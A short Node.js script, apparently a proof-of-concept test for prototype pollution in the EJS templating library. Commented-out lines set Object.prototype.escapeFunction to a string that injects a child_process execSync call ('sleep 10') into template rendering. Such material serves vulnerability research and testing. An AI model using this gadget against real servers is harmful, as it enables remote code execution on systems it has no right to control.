const ejs = require('ejs')
const path = require('path');
const templatePath = path.join(__dirname, 'views', 'hello.ejs');

// Object.prototype.client = true
// Object.prototype.escapeFunction = "false;\nprocess.mainModule.require('child_process').execSync(\`sleep 10\`)\n"

var result = ejs.renderFile(templatePath, {})